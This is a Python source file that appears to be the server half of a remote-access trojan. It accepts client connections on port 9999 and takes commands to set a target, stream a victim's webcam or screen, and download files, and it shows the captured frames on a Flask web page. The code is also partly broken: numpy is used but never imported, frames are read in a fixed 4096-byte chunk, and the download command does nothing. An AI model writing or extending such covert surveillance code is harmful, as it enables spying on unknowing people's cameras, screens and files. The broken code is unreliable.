import socket
import threading
import time
import cv2
import os
from flask import Flask, render_template, Response

app = Flask(__name__)

# Global variables to store the current target and streams
target_ip = None
client_connection = None
streaming_type = None  # Can be "webcam" or "screen"

# Start Flask web server for streaming
def start_web_server():
    app.run(host="0.0.0.0", port=5000)

# Route for streaming the webcam or screen feed
@app.route('/stream')
def stream():
    def generate():
        while True:
            if streaming_type == "webcam" and client_connection:
                # Capture webcam feed from client
                frame = capture_webcam(client_connection)
            elif streaming_type == "screen" and client_connection:
                # Capture screen feed from client
                frame = capture_screen(client_connection)
            else:
                continue

            # Convert frame to JPEG and stream it
            _, jpeg_frame = cv2.imencode('.jpg', frame)
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + jpeg_frame.tobytes() + b'\r\n\r\n')

    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

# Capture webcam feed from client
def capture_webcam(client_socket):
    # This function would handle receiving frames from the client (already implemented in your client code)
    frame = receive_frame_from_client(client_socket)  # Assuming `receive_frame_from_client` is a function that receives frames
    return frame

# Capture screen feed from client
def capture_screen(client_socket):
    # This function would handle receiving frames from the client (already implemented in your client code)
    frame = receive_frame_from_client(client_socket)  # Assuming `receive_frame_from_client` is a function that receives frames
    return frame

# Receive frame from client
def receive_frame_from_client(client_socket):
    frame_data = client_socket.recv(4096)  # Adjust size accordingly to receive full frames
    frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
    return frame

# Handle incoming client connections
def handle_client_connection(client_socket, addr):
    global target_ip, client_connection, streaming_type

    while True:
        command = client_socket.recv(1024).decode()

        if not command:
            break

        # Handle commands from server to client
        if command.startswith("!set target"):
            target_ip = command.split(" ")[2]
            print(f"Target IP set to {target_ip}")
            client_socket.send(f"Target IP set to {target_ip}".encode())
        elif command.startswith("!remove target"):
            target_ip = None
            print("Target removed.")
            client_socket.send("Target removed.".encode())
        elif command.startswith("!webcam_stream"):
            streaming_type = "webcam"
            print("Starting webcam stream...")
            client_socket.send("Starting webcam stream...".encode())
        elif command.startswith("!screen_stream"):
            streaming_type = "screen"
            print("Starting screen stream...")
            client_socket.send("Starting screen stream...".encode())
        elif command.startswith("!download"):
            # Handle file download (existing functionality)
            file_path = command.split(" ")[1]
            print(f"Downloading file: {file_path}")
            client_socket.send(f"[ * ] Downloading file: {file_path}".encode())

# Start the server
def server_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))  # Listening on port 9999
    server.listen(5)
    print("Server listening for connections...")

    while True:
        client_socket, addr = server.accept()
        print(f"Client connected from {addr}")
        threading.Thread(target=handle_client_connection, args=(client_socket, addr)).start()

if __name__ == "__main__":
    # Start Flask server in a separate thread for streaming
    threading.Thread(target=start_web_server).start()

    # Start the main server listener
    server_listener()
